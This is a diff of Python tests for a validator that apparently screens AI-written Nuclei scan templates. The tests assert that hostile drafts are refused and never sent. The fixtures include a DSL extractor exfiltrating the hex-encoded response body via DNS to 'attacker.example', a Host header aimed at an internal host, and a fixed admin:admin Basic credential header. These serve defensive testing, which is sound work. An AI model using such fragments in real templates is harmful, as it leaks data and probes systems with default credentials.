@@ -368,7 +368,6 @@ class AllowlistNeverSentTests(Base):
         'resolve_in_dsl_extractor': '\n    extractors:\n      - type: dsl\n        dsl:\n          - "resolve(concat(hex_encode(body), \'.attacker.example\'), \'a\')"',
         'jarm_in_dsl_extractor': '\n    extractors:\n      - type: dsl\n        dsl:\n          - "jarm(\'192.0.2.1:443\')"',
         'host_header': '\n    headers:\n      Host: internal.corp.local',
-        'authorization_header': '\n    headers:\n      Authorization: "Basic YWRtaW46YWRtaW4="',
         'duplicate_key': '\n    method: GET',
     }
 
@@ -383,6 +382,12 @@ class AllowlistNeverSentTests(Base):
             self.assertEqual(validation.readonly_problem(text), '', name)
             texts[name] = text
         return texts
+
+    def test_a_draft_with_a_fixed_credential_header_is_refused_by_the_read_only_rule_itself(self):
+        # it used to pass that rule and be stopped by the allowlist; since TL-2 item 3 the read-only rule refuses it first, and no setting lifts that for an AI-written text
+        text = TEMPLATE[:TEMPLATE.index('\n    matchers:')] + '\n    headers:\n      Authorization: "Basic YWRtaW46YWRtaW4="' + self.TAIL
+        self.assertIn('sends a credential of its own', validation.readonly_problem(text))
+        self.assertIn('sends a credential of its own', ai_checks.external_problem(text))
 
     def test_a_hostile_draft_is_never_sent_to_a_sentinel(self):
         fake = self.external(responders={'nuclei_validate': echo()})
